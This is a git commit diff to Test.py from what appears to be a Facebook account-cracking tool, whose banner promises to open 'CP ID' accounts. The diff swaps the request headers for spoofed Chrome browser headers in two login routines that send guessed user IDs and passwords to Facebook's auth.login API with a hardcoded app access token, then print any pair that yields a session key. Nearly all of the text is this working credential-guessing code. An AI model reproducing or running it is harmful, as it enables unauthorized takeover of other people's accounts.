083088036ac08004c36a30f9a32a1d0cfd10b2aa
ARSHAD AHMED TOPU <134373949+ARSHAD-404-CYBER@users.noreply.github.com>
2023-05-26 13:24:38 +0600

    Add files via upload

--- Test.py
+++ Test.py
@@ -386,22 +386,8 @@ logo = ("""\033[1;32m
 \033[1;33m██╔══██║██╔══██╗╚════██║██╔══██║██╔══██║██║  ██║
 \033[1;32m██║  ██║██║  ██║███████║██║  ██║██║  ██║██████╔╝
 \033[1;33m╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
-                                                
-                                                
-                                              
-                                                
-                                                
-                                                
-                                                
-                                                
-
-
-
-
-\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW😽
-
-        
- 
+                                                                                                                                                                                                                                                                                                                                                                                    
+\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW😽        
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
   \033[1;32mAuther  :ARSHAD AHMED TOPU
   \033[1;33mYouTube :ARSHAD AHMED TOPU
@@ -867,15 +853,21 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
-			}
+                  'authority': 'www.facebook.com',
+                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                  'accept-language': 'en-US,en;q=0.9',
+                  'cache-control': 'max-age=0',  
+                  'referer': 'https://www.google.com/',
+                  'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+                  'sec-ch-ua-mobile': '?0',
+                  'sec-ch-ua-platform': '"Linux"',
+                  'sec-fetch-dest': 'document',
+                  'sec-fetch-mode': 'navigate',
+                  'sec-fetch-site': 'cross-site',
+                  'sec-fetch-user': '?1',
+                 'upgrade-insecure-requests': '1',
+                 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+        }
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[ ARSHAD-OK ] %s | %s\033[0;97m         "%(uid, pw))
@@ -1294,15 +1286,21 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
-			}
+                  'authority': 'www.facebook.com',
+                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                  'accept-language': 'en-US,en;q=0.9',
+                  'cache-control': 'max-age=0',
+                  'referer': 'https://www.google.com/',
+                  'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+                  'sec-ch-ua-mobile': '?0',
+                  'sec-ch-ua-platform': '"Linux"',
+                  'sec-fetch-dest': 'document',
+                  'sec-fetch-mode': 'navigate',
+                  'sec-fetch-site': 'cross-site',
+                  'sec-fetch-user': '?1',
+                  'upgrade-insecure-requests': '1',
+                  'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+          }
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[ARSHAD-OK ] %s | %s\033[0;97m         "%(uid, pw))
